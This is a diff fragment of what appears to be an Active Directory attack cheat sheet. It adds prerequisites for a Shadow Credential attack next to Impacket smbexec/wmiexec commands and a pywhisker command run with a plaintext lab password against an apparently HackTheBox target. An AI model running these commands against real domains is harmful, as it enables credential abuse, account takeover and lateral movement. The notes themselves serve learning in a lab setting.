@@ -413,6 +413,10 @@ python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 #### Shadow Credential Attack
+Prerequsites:  
+1. have write permission on msDS-KeyCredentialLink property over targeted account
+2. DC meedts Windows Server 2016+  
+3. ADCS existed
 ```
 python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
 [*] Searching for the target account
